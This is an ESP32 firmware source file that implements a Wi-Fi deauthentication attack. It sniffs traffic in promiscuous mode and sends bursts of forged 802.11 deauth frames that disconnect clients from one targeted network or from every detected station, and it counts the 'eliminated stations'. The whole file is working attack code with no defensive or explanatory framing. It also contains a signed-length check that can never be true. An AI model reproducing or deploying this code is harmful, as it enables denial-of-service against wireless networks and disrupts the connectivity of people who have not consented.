#include <WiFi.h>
#include <esp_wifi.h>
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"
#include "types.h"
#include "deauth.h"
#include "definitions.h"

deauth_frame_t deauth_frame;
int deauth_type = DEAUTH_TYPE_SINGLE;
int eliminated_stations;

static SemaphoreHandle_t wifi_mutex = nullptr;

static void wifi_lock() {
  if (!wifi_mutex) {
    wifi_mutex = xSemaphoreCreateMutex();
  }
  if (wifi_mutex) xSemaphoreTake(wifi_mutex, portMAX_DELAY);
}

static void wifi_unlock() {
  if (wifi_mutex) xSemaphoreGive(wifi_mutex);
}

esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t *)buf;
  const wifi_packet_t *packet = (wifi_packet_t *)raw_packet->payload;
  const mac_hdr_t *mac_header = &packet->hdr;

  const uint16_t packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);

  if (packet_length < 0) return;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    if (memcmp(mac_header->dest, deauth_frame.sender, 6) == 0) {
      wifi_lock();
      memcpy(deauth_frame.station, mac_header->src, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
        esp_err_t r = esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
        if (r != ESP_OK) DEBUG_PRINTF("esp_wifi_80211_tx error: %d\n", r);
      }
      eliminated_stations++;
      wifi_unlock();
    } else return;
  } else {
    if ((memcmp(mac_header->dest, mac_header->bssid, 6) == 0) && (memcmp(mac_header->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)) {
      wifi_lock();
      memcpy(deauth_frame.station, mac_header->src, 6);
      memcpy(deauth_frame.access_point, mac_header->dest, 6);
      memcpy(deauth_frame.sender, mac_header->dest, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
        esp_err_t r = esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
        if (r != ESP_OK) DEBUG_PRINTF("esp_wifi_80211_tx error: %d\n", r);
      }
      wifi_unlock();
    } else return;
  }

  DEBUG_PRINTF("Send %d Deauth-Frames to: %02X:%02X:%02X:%02X:%02X:%02X\n", NUM_FRAMES_PER_DEAUTH, mac_header->src[0], mac_header->src[1], mac_header->src[2], mac_header->src[3], mac_header->src[4], mac_header->src[5]);
  BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
}

void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
  eliminated_stations = 0;
  deauth_type = attack_type;

  deauth_frame.reason = reason;

  wifi_lock();

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    DEBUG_PRINT("Starting Deauth-Attack on network: ");
    DEBUG_PRINTLN(WiFi.SSID(wifi_number));
    WiFi.softAP(AP_SSID, AP_PASS, WiFi.channel(wifi_number));
    memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_number), 6);
    memcpy(deauth_frame.sender, WiFi.BSSID(wifi_number), 6);
  } else {
    DEBUG_PRINTLN("Starting Deauth-Attack on all detected stations!");
    WiFi.softAPdisconnect();
    WiFi.mode(WIFI_MODE_STA);
  }

  esp_err_t err;
  err = esp_wifi_set_promiscuous(true);
  if (err != ESP_OK) DEBUG_PRINTF("esp_wifi_set_promiscuous error: %d\n", err);
  err = esp_wifi_set_promiscuous_filter(&filt);
  if (err != ESP_OK) DEBUG_PRINTF("esp_wifi_set_promiscuous_filter error: %d\n", err);
  err = esp_wifi_set_promiscuous_rx_cb(&sniffer);
  if (err != ESP_OK) DEBUG_PRINTF("esp_wifi_set_promiscuous_rx_cb error: %d\n", err);

  wifi_unlock();
}

void stop_deauth() {
  DEBUG_PRINTLN("Stopping Deauth-Attack..");
  wifi_lock();
  esp_err_t err = esp_wifi_set_promiscuous(false);
  if (err != ESP_OK) DEBUG_PRINTF("esp_wifi_set_promiscuous(false) error: %d\n", err);
  wifi_unlock();
}
